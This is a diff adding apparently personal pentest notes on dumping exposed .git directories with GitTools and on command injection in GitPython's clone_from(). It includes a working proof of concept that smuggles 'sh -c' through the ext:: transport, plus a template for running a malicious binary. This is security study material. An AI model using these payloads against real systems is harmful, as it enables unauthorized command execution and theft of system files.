@@ -875,6 +875,56 @@ Decoded header||payload-:```{"kid":"b854b842-0339-44da-b38f-984684b91506","alg":
 
   ![image](https://github.com/user-attachments/assets/38897cad-609e-4c4a-866c-b5f2b7e375f3)
 
+---------------------
+
+### Dumping .git sensitive info
+
+- Use [GitTools](https://github.com/internetwache/GitTools)'s `Extractor/extractor.sh` to dump sensitive info
+
+![image](https://github.com/user-attachments/assets/a4ea7cfd-378f-4f3e-b725-67be8be9ae11)
+
+- Objects spotted
+
+![image](https://github.com/user-attachments/assets/520e4b68-2b84-4569-8058-92bda7c2101b)
+
+----------------------
+
+### Exploiting clone_from() Gitpython function
+
+- Exploiting this vulnerability is possible because the library makes external calls to git without sufficient sanitization of input arguments. This is only relevant when enabling the ext transport protocol.
+
+- POC
+  
+      from git import Repo
+      r = Repo.init('', bare=True)
+      r.clone_from('ext::sh -c touch% /tmp/pwned', 'tmp', multi_options=["-c protocol.ext.allow=always"])
+
+- A good method to exploit it to create a script and run the script with the `ext::sh`.e.g
+
+![image](https://github.com/user-attachments/assets/63fe448c-d9ce-4dc1-8b0b-cfe73041b2f9)
+
+- Shadow file result
+
+![image](https://github.com/user-attachments/assets/242797a1-e1fe-4bb0-bd93-c90a0c48455f)
+
+- Payload-:```ext::bash -c [path_to your_malicious_binary]% ls2```
+
+------------------------
+
+### Reference:
+
+- [Snyk](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858)
+
+-------------------------
+
+
+
+
+
+
+
+
+
 
 
 
